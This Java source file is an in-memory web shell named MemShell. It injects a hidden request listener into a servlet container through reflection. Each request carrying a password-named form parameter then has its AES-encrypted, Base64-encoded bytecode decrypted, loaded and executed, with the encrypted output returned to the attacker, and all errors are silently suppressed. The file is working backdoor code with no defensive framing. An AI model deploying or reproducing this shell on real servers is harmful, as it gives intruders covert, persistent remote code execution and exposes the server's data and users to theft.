package main;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Base64;

public class MemShell extends ClassLoader implements InvocationHandler {
    private static boolean initialized = false;
    private static Object lock = new Object();
    private static Class payloadClass;
    private static String password;
    private static String key;
    public MemShell(ClassLoader loader){
        super(loader);
    }
    public MemShell(){
        synchronized (lock){
            if (!initialized){
                try {
                    Class servletRequestListenerClass = null;
                    try {
                        servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
                    } catch (Exception e) {
                        try {
                            servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
                        } catch (ClassNotFoundException ex) {

                        }
                    }
                    if (servletRequestListenerClass!=null){
                        addListener(Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{servletRequestListenerClass},this),getStandardContext());
                    }
                }catch (Throwable e){

                }
                initialized = true;
            }
        }
    }


    private Object getStandardContext() {
        try {
            Object request = Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getRequest").invoke(null);
            Object servletContext = invokeMethod(request, "getServletContext");
            return getFieldValue(getFieldValue(servletContext,"context"), "context");
        } catch (Exception e) {

            return null;
        }
    }

    private String addListener(Object listener,Object standardContext)throws Exception{
        Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener",Object.class);
        addApplicationEventListenerMethod.setAccessible(true);
        addApplicationEventListenerMethod.invoke(standardContext,listener);
        return "ok";
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")){
            Object servletRequestEvent = args[0];
            backDoor(servletRequestEvent);
        }
        return null;
    }

    private Object invokeMethod(Object obj,String methodName,Object... parameters){
        try {
            ArrayList classes = new ArrayList();
            if (parameters!=null){
                for (int i=0;i<parameters.length;i++){
                    Object o1=parameters[i];
                    if (o1!=null){
                        classes.add(o1.getClass());
                    }else{
                        classes.add(null);
                    }
                }
            }
            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        }catch (Exception e){
//        	e.printStackTrace();
        }
        return null;
    }
    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
        Method method=null;
        while (cs!=null){
            try {
                method=cs.getMethod(methodName, parameters);
                cs=null;
            }catch (Exception e){
                cs=cs.getSuperclass();
            }
        }
        return method;
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            Method method=null;
            Class cs=obj.getClass();
            while (cs!=null){
                try {
                    f=cs.getDeclaredField(fieldName);
                    cs=null;
                }catch (Exception e){
                    cs=cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }
    public String getParameter(Object requestObject,String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }
    public String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }


    public byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

    private void backDoor(Object servletRequestEvent)  {
        try {
            Object request = invokeMethod(servletRequestEvent,"getServletRequest");

            if (true){
                try {
                    String contentType = getContentType(request);
                    if (contentType!=null && contentType.contains("application/x-www-form-urlencoded")) {
                        String value = getParameter(request,password);
                        if (value!=null){
                            byte[] data = Base64.getDecoder().decode(value);
                            data = aes(data, false);
                            if (data != null && data.length > 0){
                                if (payloadClass == null) {
                                    payloadClass =  new MemShell(request.getClass().getClassLoader()).defineClass(data,0,data.length);
                                } else {
                                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                    Object f = payloadClass.newInstance();
                                    f.equals(arrOut);
                                    f.equals(request);
                                    f.equals(data);
                                    f.toString();
                                    String md5 = md5(password + key);
                                    if (arrOut.size()>0) {
                                        Object response =  getFieldValue(getFieldValue(request,"request"),"response");
                                        PrintWriter printWriter = (PrintWriter) invokeMethod(response,"getWriter");
                                        printWriter.write(md5.substring(0, 16));
                                        printWriter.write(Base64.getEncoder().encodeToString(aes(arrOut.toByteArray(), true)));
                                        printWriter.write(md5.substring(16));
                                        printWriter.flush();
                                        printWriter.close();
                                    }
                                }
                            }
                        }
                    }

                }catch (Throwable e){
                }
            }
        }catch (Exception e){

        }
    }


}
